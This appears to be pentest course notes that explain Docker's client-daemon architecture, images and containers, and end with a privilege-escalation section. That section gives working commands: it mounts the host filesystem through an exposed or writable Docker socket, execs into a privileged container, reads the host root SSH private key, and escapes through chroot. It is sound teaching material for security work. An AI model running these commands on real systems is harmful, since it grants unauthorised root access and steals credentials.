## Docker Architecture

At the core of the Docker architecture lies a client-server model, where we have two primary components:

- The Docker daemon
- The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

#### Docker Daemon

The `Docker Daemon`, also known as the Docker server, is a critical part of the Docker platform that plays a pivotal role in container management and orchestration.

#### Managing Docker Containers

Firstly, it handles the core containerization functionality. It coordinates the creation, execution, and monitoring of Docker containers, maintaining their isolation from the host and other containers. This isolation ensures that containers operate independently, with their own file systems, processes, and network interfaces. Furthermore, it handles Docker image management. It pulls images from registries, such as [Docker Hub](https://hub.docker.com/) or private repositories, and stores them locally.

Additionally, the Docker Daemon offers monitoring and logging capabilities, for example:
- Captures container logs
- Provides insight into container activities, errors, and debugging information.

#### Network and Storage

It facilitates container networking by creating virtual networks and managing network interfaces. It enables containers to communicate with each other and the outside world through network ports, IP addresses, and DNS resolution. The Docker Daemon also plays a critical role in storage management, since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachment, and clean-up, allowing containers to share or store data independently of each other.
#### Docker Clients

When we interact with Docker, we issue commands through the `Docker Client`, which communicates with the Docker Daemon (through a `RESTful API` or a `Unix socket`) and serves as our primary means of interacting with Docker. We also have the ability to create, start, stop, manage, remove containers, search, and download Docker images. With these options, we can pull existing images to use as a base for our containers or build our custom images using Dockerfiles. We have the flexibility to push our images to remote repositories, facilitating collaboration and sharing within our teams or with the wider community.

In comparison, the Daemon, on the other hand, carries out the requested actions, ensuring containers are created, launched, stopped, and removed as required.

Another client for Docker is `Docker Compose`. It is a tool that simplifies the orchestration of multiple Docker containers as a single application. It allows us to define our application's multi-container architecture using a declarative `YAML` (`.yaml`/`.yml`) file. With it, we can specify the services comprising our application, their dependencies, and their configurations. We define container images, environment variables, networking, volume bindings, and other settings. Docker Compose then ensures that all the defined containers are launched and interconnected, creating a cohesive and scalable application stack.

## Docker Images and Containers

Think of a `Docker image` as a blueprint or a template for creating containers. It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations. An image is a self-contained, read-only package that ensures consistency and reproducibility across different environments. We can create images using a text file called a `Dockerfile`, which defines the steps and instructions for building the image.

A `Docker container` is an instance of a Docker image. It is a lightweight, isolated, and executable environment that runs applications. When we launch a container, it is created from a specific image, and the container inherits all the properties and configurations defined in that image. Each container operates independently, with its own filesystem, processes, and network interfaces. This isolation ensures that applications within containers remain separate from the underlying host system and other containers, preventing conflicts and interference.

While `images` are immutable and `read-only`, `containers` are mutable and `can be modified` during runtime. We can interact with containers, execute commands within them, monitor their logs, and even make changes to their filesystem or environment. However, any modifications made to a container's filesystem are not persisted unless explicitly saved as a new image or stored in a persistent volume.

## Docker Privilege Escalation

#### Docker Shared Directories

When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container.

#### Docker Sockets

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.

 Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios

```shell
/tmp/docker -H unix:///app/docker.sock ps
```

```shell
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

```shell
/tmp/docker -H unix:///app/docker.sock ps
```

```shell
 /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

```shell
cat /hostsystem/root/.ssh/id_rsa
```

#### Docker Group

```shell
id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

```shell
docker image ls
```

#### Docker Socket

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```